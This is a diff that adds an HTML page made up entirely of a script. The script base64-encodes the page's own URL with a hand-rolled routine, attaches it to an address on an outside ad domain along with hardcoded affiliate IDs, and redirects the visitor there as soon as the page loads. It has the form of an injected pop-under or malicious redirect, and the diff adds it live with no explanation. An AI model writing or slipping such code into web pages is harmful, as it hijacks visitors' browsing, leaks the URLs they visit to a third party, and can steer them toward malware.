@@ -1,0 +1,39 @@
+<html>
+<head>
+<head>
+
+<body>
+<script type="text/javascript">
+   var uid = '338123';
+   var wid = '665868';
+	window.pop_fcap || (window.pop_fcap = 1);
+	var e = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
+	a = 1e16 * Math.random(),
+	t = "http://p.rapolok.com/go/" + window.uid + "/" + window.wid + "/" + function (o) {
+		o = escape(o);
+		var a,
+		t,
+		n,
+		i,
+		p,
+		c = "",
+		d = "",
+		r = "",
+		w = 0;
+		do {
+			n = (a = o.charCodeAt(w++)) >> 2,
+			i = (3 & a) << 4 | (t = o.charCodeAt(w++)) >> 4,
+			p = (15 & t) << 2 | (d = o.charCodeAt(w++)) >> 6,
+			r = 63 & d,
+			isNaN(t) ? p = r = 64 : isNaN(d) && (r = 64),
+			c = c + e.charAt(n) + e.charAt(i) + e.charAt(p) + e.charAt(r),
+			a = t = d = "",
+			n = i = p = r = ""
+		} while (w < o.length);
+		return c
+	}
+	(document.URL) + "?cb=" + a;
+	window.location.href = t;
+</script>
+</body>
+</html>
